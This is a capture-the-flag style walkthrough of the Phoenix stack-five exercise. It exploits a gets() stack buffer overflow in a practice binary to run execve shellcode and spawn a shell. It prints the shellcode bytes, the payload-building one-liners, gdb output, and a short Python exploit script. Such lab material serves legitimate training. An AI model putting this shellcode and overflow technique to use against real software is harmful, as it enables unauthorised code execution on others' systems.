# PHOENIX - stack 5

Lets list the files using ```ls -la```,

```
user@phoenix-amd64:~$ ls -la
total 28
drwxr-xr-x 2 user user 4096 Jun  6 06:04 .
drwxr-xr-x 3 root root 4096 Jan 13  2019 ..
-rw-r--r-- 1 user user  220 Jan 13  2019 .bash_logout
-rw-r--r-- 1 user user 3526 Jan 13  2019 .bashrc
-rw-r--r-- 1 user user  675 Jan 13  2019 .profile
-rwxr-xr-x 1 user user 5632 Jun  6 06:04 stack-five
```

Lets check the file type of the binary using ```file``` command,

```
user@phoenix-amd64:~$ file stack-five
stack-five: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped
```

It is a ```not stripped``` binary

Lets try running it

```
user@phoenix-amd64:~$ ./stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
monish
user@phoenix-amd64:~$ ./stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Seems like its expecting some other input

Lets analyse it in debugger

Viewing functions,

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x00000000004003c8  _init
0x00000000004003f0  gets@plt
0x0000000000400400  puts@plt
0x0000000000400410  __libc_start_main@plt
0x0000000000400420  _start
0x0000000000400436  _start_c
0x0000000000400460  deregister_tm_clones
0x0000000000400490  register_tm_clones
0x00000000004004d0  __do_global_dtors_aux
0x0000000000400560  frame_dummy
0x000000000040058d  start_level
0x00000000004005a4  main
0x00000000004005d0  __do_global_ctors_aux
0x0000000000400612  _fini
```

Disassembling ```main()```,

```
pwndbg> disassemble main
Dump of assembler code for function main:
   0x00000000004005a4 <+0>:	  push   rbp
   0x00000000004005a5 <+1>:	  mov    rbp,rsp
   0x00000000004005a8 <+4>:	  sub    rsp,0x10
   0x00000000004005ac <+8>:	  mov    DWORD PTR [rbp-0x4],edi
   0x00000000004005af <+11>:	mov    QWORD PTR [rbp-0x10],rsi
   0x00000000004005b3 <+15>:	mov    edi,0x400620
   0x00000000004005b8 <+20>:	call   0x400400 <puts@plt>
   0x00000000004005bd <+25>:	mov    eax,0x0
   0x00000000004005c2 <+30>:	call   0x40058d <start_level>
   0x00000000004005c7 <+35>:	mov    eax,0x0
   0x00000000004005cc <+40>:	leave
   0x00000000004005cd <+41>:	ret
End of assembler dump.
```

```main()``` calls ```start_level()```

Disassembling ```start_level()```,

```
pwndbg> disassemble start_level
Dump of assembler code for function start_level:
   0x000000000040058d <+0>:	  push   rbp
   0x000000000040058e <+1>:	  mov    rbp,rsp
   0x0000000000400591 <+4>:	  add    rsp,0xffffffffffffff80
   0x0000000000400595 <+8>:	  lea    rax,[rbp-0x80]
   0x0000000000400599 <+12>:	mov    rdi,rax
   0x000000000040059c <+15>:	call   0x4003f0 <gets@plt>
   0x00000000004005a1 <+20>:	nop
   0x00000000004005a2 <+21>:	leave
   0x00000000004005a3 <+22>:	ret
End of assembler dump.
```

Lets take a look at the source code of this binary for proper understanding,

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void start_level() {
  char buffer[128];
  gets(buffer);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```

In HINT they have mentioned that this challenge is something related to "shellcode"

Our aim on this challenge is to execute our shellcode in stack and pop a shell

Important things to note in this binary are,

```
  char buffer[128];
  gets(buffer);
```

Our ```buffer``` is large enough to accomodate our shellcode

```gets()``` is used, so we can use this as our advantage to perform an overflow attack

First lets try to crash this binary,

```
user@phoenix-amd64:~$ python -c "print('A'*100)"|./stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
user@phoenix-amd64:~$ python -c "print('A'*128)"|./stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
Segmentation fault
user@phoenix-amd64:~$ python -c "print('A'*150)"|./stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
Segmentation fault
```

So we are able to crash our binary

We will analyse it further in our debugger

Inorder to pass a shellcode and execute it successfully, we must point our ```$rip``` return address correctly to the address where shellcode is placed

Here we will be passing shellcode into our ```buffer```

So we need to know the starting address of the ```buffer```

```
   0x0000000000400595 <+8>:	  lea    rax,[rbp-0x80]
   0x0000000000400599 <+12>:	mov    rdi,rax
   0x000000000040059c <+15>:	call   0x4003f0 <gets@plt>
```

Since ```gets()``` is used to store the data inside ```buffer```, we can use break point to analyse the value of ```rbp-0x80``` which is the starting address of ```buffer```

Setting breakpoint,

```
(gdb) disassemble start_level
Dump of assembler code for function start_level:
   0x000000000040058d <+0>:	  push   rbp
   0x000000000040058e <+1>:	  mov    rbp,rsp
   0x0000000000400591 <+4>:	  add    rsp,0xffffffffffffff80
   0x0000000000400595 <+8>:	  lea    rax,[rbp-0x80]
   0x0000000000400599 <+12>:	mov    rdi,rax
   0x000000000040059c <+15>:	call   0x4003f0 <gets@plt>
   0x00000000004005a1 <+20>:	nop
   0x00000000004005a2 <+21>:	leave
   0x00000000004005a3 <+22>:	ret
End of assembler dump.
gdb) b *0x000000000040059c
Breakpoint 1 at 0x40059c
```

Now run and find the address,

```
(gdb) r
Starting program: /home/user/stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education

Breakpoint 1, 0x000000000040059c in start_level ()

....

(gdb) print $rbp-0x80
$1 = (void *) 0x7fffffffe530
```

So the starting address of our ```buffer``` is ```0x7fffffffe530```

To pop a shell, we will be using the 27 bytes shellcode below,

```
\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
```

Lets exploit the binary now,

```payload = junk(nops) + shellcode + junk + base pointer + return address```

Here "nops" is referred as "No Operation" , and it is given by ```\x90```

After our ```buffer``` we need to fill our ```Base Pointer (8 bytes)``` to reach our ```$rip```

In ```$rip``` we will be filling it with ```0x7fffffffe530```,the starting address of our ```buffer```

Fuzzing it,

```
user@phoenix-amd64:~$ python -c "print('A'*128+'B'*8+'C'*6)"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCC
user@phoenix-amd64:~$ python -c "print('A'*128+'B'*8+'C'*6)" > fuzz
user@phoenix-amd64:~$ cat fuzz
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCC

In debugger,

(gdb) r < fuzz
Starting program: /home/user/stack-five < fuzz
Welcome to phoenix/stack-five, brought to you by https://exploit.education

Program received signal SIGSEGV, Segmentation fault.
0x0000434343434343 in ?? ()

gdb) info registers rip
rip            0x434343434343      0x434343434343
```

So we can overwrite the ```$rip``` correctly

Crafting the payload,

```
user@phoenix-amd64:~$ python -c "print('\x90'*30+'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'\x90'*(128-30-27)+'B'*8+'\x30\xe5\xff\xff\xff\x7f')"
1H????H???T_RWT^;BBBBBBBB0???
user@phoenix-amd64:~$ python -c "print('\x90'*30+'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'\x90'*(128-30-27)+'B'*8+'\x30\xe5\xff\xff\xff\x7f')" > exploit
```

Testing it in debugger,

```
(gdb) r <exploit
Starting program: /home/user/stack-five <exploit
Welcome to phoenix/stack-five, brought to you by https://exploit.education
process 9904 is executing new program: /bin/dash
warning: Could not load shared library symbols for linux-vdso.so.1.
Do you need "set solib-search-path" or "set sysroot"?
[Inferior 1 (process 9904) exited normally]
```

Exploit in python,

```
from pwn import *
rip="\x30\xe5\xff\xff\xff\x7f"        #p64(0x7fffffffe530)
bp="B"*8
shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
nops="\x90"
payload=""
payload+=nops*30
payload+=shellcode
payload+="A"*(128-len(payload))
payload+=bp
payload+=rip
print(payload)
```


